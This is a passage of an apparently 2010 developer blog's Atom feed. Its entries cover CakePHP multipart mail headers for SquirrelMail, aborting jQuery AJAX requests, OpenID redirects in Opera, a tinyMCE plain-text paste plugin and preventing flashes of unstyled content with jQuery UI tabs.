        &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#__CaretPlacholder&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Before finding this solution, I tried the &lt;code&gt;onBeforeSetContent&lt;/code&gt;callback, but
due to a bug in the tinyMCE source, it couldn&amp;#39;t handle well the case where the
editor is empty. So I had to resort to a more generic callback.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Displaying HTML mails sent from cakePHP in SquirrelMail</title>
   <link href="http://blog.pixelastic.com/2010/10/11/displaying-html-mails-sent-from-cakephp-in-squirrelmail/"/>
   <updated>2010-10-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/11/displaying-html-mails-sent-from-cakephp-in-squirrelmail</id>
   <content type="html">&lt;p&gt;I just stumble upon the fact that my automated multipart (text + html) mails
sent from my apps weren&amp;#39;t correctly displayed on SquirrelMail.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m personnaly using GMail for my day to day email needs, but one of my client
was using the default &lt;a href=&quot;http://squirrelmail.org/&quot;&gt;SquirrelMail&lt;/a&gt; (v1.4.21)
install on their &lt;a href=&quot;http://www.dreamhost.com/&quot;&gt;Dreamhost account&lt;/a&gt;. The received
mails are not correctly parsed and get displayed as plain text, even if the
header clearly specifiy a &lt;code&gt;Content-Type: multipart/alternative;
boundary=&amp;quot;alt-&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The first culprit was that no boundary were given. This does not seem to cause
GMail any problem, but I thought that SquirrelMail may choke on that. So I
manually added a &lt;code&gt;$this-&amp;gt;Email-&amp;gt;_createboundary();&lt;/code&gt; call before my
&lt;code&gt;$this-&amp;gt;Email-&amp;gt;send();&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Still, no succes. After some googling I found a &lt;a href=&quot;http://cakephp.lighthouseapp.com/projects/42648-cakephp/tickets/14%0A-email-component-should-set-mime-version-header-when-sendas-html-or-both&quot;&gt;bug
report&lt;/a&gt; for
a similar problem. I tried adding the suggested MIME header, and that solved
my problem.&lt;/p&gt;

&lt;p&gt;So here&amp;#39;s my updated code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Email-&amp;gt;sendAs = &amp;#39;both&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Email-&amp;gt;_createboundary();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Email-&amp;gt;__header[] = &amp;#39;MIME-Version: 1.0&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;Email-&amp;gt;send();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I&amp;#39;ll now have to add those two additional line of code everytime I&amp;#39;ll have to
send a multipart (html + text) email in cakePHP, until it get fixed (no
specified milestone).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Aborting an AJAX request with jQuery</title>
   <link href="http://blog.pixelastic.com/2010/10/06/aborting-an-ajax-request-with-jquery/"/>
   <updated>2010-10-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/06/aborting-an-ajax-request-with-jquery</id>
   <content type="html">&lt;p&gt;I needed a way to abort a pending AJAX request. I had a dialog box loaded
through AJAX, but I let my users the possibility to close the window before it
was completely loaded.&lt;/p&gt;

&lt;p&gt;I thought I could easily cancel a request using jQuery but it appears that
there is no method to do that. I had to instead directly call the &lt;code&gt;.abort()&lt;/code&gt;
method on the XHR object returned by &lt;code&gt;$.ajax&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;What I learned was that aborting an XHR request still triggered the jQuery
ajax &lt;code&gt;complete&lt;/code&gt;callback, and even passed aÂ &lt;code&gt;success&lt;/code&gt; as second argument.&lt;/p&gt;

&lt;p&gt;My complete callback was supposed to display the loaded window, so I really
didn&amp;#39;t want it to fire if the user closed the loading window.&lt;/p&gt;

&lt;p&gt;I finally had to check on the &lt;code&gt;XHR.status&lt;/code&gt; property (200 if ok, 0 if aborted)
to manually stop the &lt;code&gt;complete&lt;/code&gt;callback.&lt;/p&gt;

&lt;p&gt;It felt surprising at first that an abort call is not intercepted as an error,
but after a little more thinking, it is logical. An abort is something that
the user asked for, so it shouldn&amp;#39;t be considered an error (which is something
that no one ever asked for).&lt;/p&gt;

&lt;p&gt;On the other hand, it feels strange to consider an abort as a success too. I
guess the jQuery team didn&amp;#39;t have a lot of request for an edge case like abort
and didn&amp;#39;t wrap their API around it, leaving us with the low level XHR object
instead.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Openid redirect not working on Opera</title>
   <link href="http://blog.pixelastic.com/2010/10/05/openid-redirect-not-working-on-opera/"/>
   <updated>2010-10-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/05/openid-redirect-not-working-on-opera</id>
   <content type="html">&lt;p&gt;I had a hard time firguring out while my openId login method does not work
correctly with Opera.&lt;/p&gt;

&lt;p&gt;I either ended up on the redirect page forever, or did not get redirected back
to my website after Google check, or finally even get blackholed back on my
own site.&lt;/p&gt;

&lt;p&gt;I only occured with Opera.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve read on various places that the security settings of Opera are made to
prevent an automatic redirect to a website to be able to write cookie. This is
a fair defense, but it does break the whole openId concept. Or at least my
implementation.&lt;/p&gt;

&lt;p&gt;Some sites manages to get it to work, even on Opera (stackoverflow for
example).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll hide the openId login method for my Opera users until this is fixed or I
find a solution.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Copy/Paste text from Word into tinyMCE</title>
   <link href="http://blog.pixelastic.com/2010/10/05/copy-paste-text-from-word-into-tinymce/"/>
   <updated>2010-10-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/05/copy-paste-text-from-word-into-tinymce</id>
   <content type="html">&lt;p&gt;What good is building a really nice CMS with top-notch WYSIWYG editor if you
handed it to clients that will blindly copy/paste Word documents into it ?&lt;/p&gt;

&lt;p&gt;Well, it will just render a big ugly mess of proprietary and contradictory
pseudo-css rules. You could even be blamed for it.&lt;/p&gt;

&lt;h2&gt;The solution&lt;/h2&gt;

&lt;p&gt;The latest versions of tinyMCE came bundled with an improved &lt;code&gt;paste&lt;/code&gt;plugin.
It will automatically attempt to clean bad pasted text by operating some dark
voodoo magic on it.&lt;/p&gt;

&lt;p&gt;It does it quite well to be honest, removing almost all messy formatting. From
the tests I tried, I was still getting useless crap in the resulting text (CSS
comments, &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; with overly long style of color and background-color
definitions, etc).&lt;/p&gt;

&lt;p&gt;I finally decided to take a more brutal approach. The &lt;code&gt;paste&lt;/code&gt;plugin contained
a &lt;code&gt;_insertPlainText&lt;/code&gt; method that was supposed to be used in conjunction with a
toolbar icon.&lt;/p&gt;

&lt;p&gt;This method removes all formatting. Period.&lt;/p&gt;

&lt;p&gt;As I didn&amp;#39;t want to have to click on a toolbar icon before pasting my text
(and none of my actual clients would ever think of doing that either), I came
up with a very simple plugin to do the boring stuff for me.&lt;/p&gt;

&lt;h2&gt;The plugin&lt;/h2&gt;

&lt;p&gt;The only goal of this plugin is setting to &lt;code&gt;true&lt;/code&gt;the &lt;code&gt;pasteAsPlainText
&lt;/code&gt;property of every editor. This property is defaulted to &lt;code&gt;false&lt;/code&gt;but can be
swapped using the toolbar icon.&lt;/p&gt;

&lt;p&gt;I also forced the &lt;code&gt;paste_text_sticky&lt;/code&gt; setting to &lt;code&gt;true&lt;/code&gt;, preventing the
previous property to revert to &lt;code&gt;false&lt;/code&gt;after the first pasting.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s my plugin full code :&lt;/p&gt;

&lt;p&gt;Be sure to include the &lt;code&gt;paste&lt;/code&gt;plugin in your plugin list, and insert my
plugin *&lt;em&gt;after *&lt;/em&gt;the paste plugin.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;Â *Â Â Â  Will automatically convert pasted text so no junk code will be included.&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;Â *Â Â Â  This plugin depends on the core paste plugin.&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;Â **/&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tinymce.plugins.pasteAsPlainTextPlugin&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// We force the pasting to occur as plain text&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pasteAsPlainText&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// We also put it as sticky to allow for multiple pastings&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;paste_text_sticky&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// Adding some special post process&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;paste_postprocess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// If content is long text without HTML, We&amp;#39;ll break it into &amp;lt;p&amp;gt;ieces&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// Adding &amp;lt;p&amp;gt; around each line&lt;/span&gt;
          &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;sentences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sentences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sentences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

          &lt;span class=&quot;c1&quot;&gt;// Saving back in original content/node&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// Register plugin&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PluginManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;pasteAsPlainText&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pasteAsPlainTextPlugin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;I added a &lt;code&gt;postprocess&lt;/code&gt;calback after seing that the pasted text was a little
too plain in Webkit. All my text was displayed on the same line, without the
nice breaking into paragraph that Firefox showed.&lt;/p&gt;

&lt;p&gt;It occured because tinyMCE used the &lt;code&gt;event.clipboardData&lt;/code&gt; property that Webkit
browsers provides and allow for easy retrieving of clipboard data.
Unfortunatly it returned a really plain text, and I had to apply a little loop
to replace each new line with a paragraph.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How to prevent a FOUC but still gracefully degrade the jQuery UI tabs</title>
   <link href="http://blog.pixelastic.com/2010/08/21/prevent-fouc-gracefully-degrade-jquery-ui-tabs/"/>
   <updated>2010-08-21T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/21/prevent-fouc-gracefully-degrade-jquery-ui-tabs</id>
   <content type="html">&lt;p&gt;I finally managed to fix something that was bugging me for a very long time.
I&amp;#39;m talking about the jQuery UI tabs.&lt;/p&gt;

&lt;p&gt;They are pretty useful actually, but I always hated that FOUC they produce.
For one split second, you&amp;#39;ll see all your tabs content, then they&amp;#39;ll be neatly
re-arranged in tabs.&lt;/p&gt;

&lt;p&gt;What I want are my tabs displayed correctly right away, on first load.&lt;/p&gt;

&lt;h2&gt;First, the markup&lt;/h2&gt;

&lt;p&gt;Here&amp;#39;s a typical tabs markup :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;tabs&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
Â Â Â  Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#firstTab&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;First tab&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
Â Â Â  Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;#secondTab&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Second tab&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;

Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;tabPanel&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;firstTab&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
Â Â Â  Â Â Â  First tab content
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
Â Â Â 
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;tabPanel&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;secondTab&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
Â Â Â  Â Â Â  Second tab content
Â Â Â  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;CSS to hide all tabs if Javascript is disabled&lt;/h2&gt;

&lt;p&gt;If your Javascript is disabled, so will jQuery UI. We will then hide the
&lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; because it serves no purpose here. We will only show it if js is
enabled&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nc&quot;&gt;.tabs&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.js&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tabs&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;ul&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Applying jQuery UI tabs&lt;/h2&gt;

&lt;p&gt;By doing a&lt;code&gt;$(&amp;#39;.tabs&amp;#39;).tabs();&lt;/code&gt; jQuery UI will treat your &lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; as your tab
menu and all your &lt;code&gt;.tabPanel&lt;/code&gt; as their corresponding contents. It will hide
all your panels, except for the first one. It does so by adding a&lt;code&gt;.ui-tabs-
panel&lt;/code&gt; class to every &lt;code&gt;.tabPanel&lt;/code&gt; as well as a &lt;code&gt;.ui-tabs-hide&lt;/code&gt; to every panel
it hides.&lt;/p&gt;

&lt;p&gt;Right now, you should add another CSS rule to hide the unused panels :&lt;/p&gt;
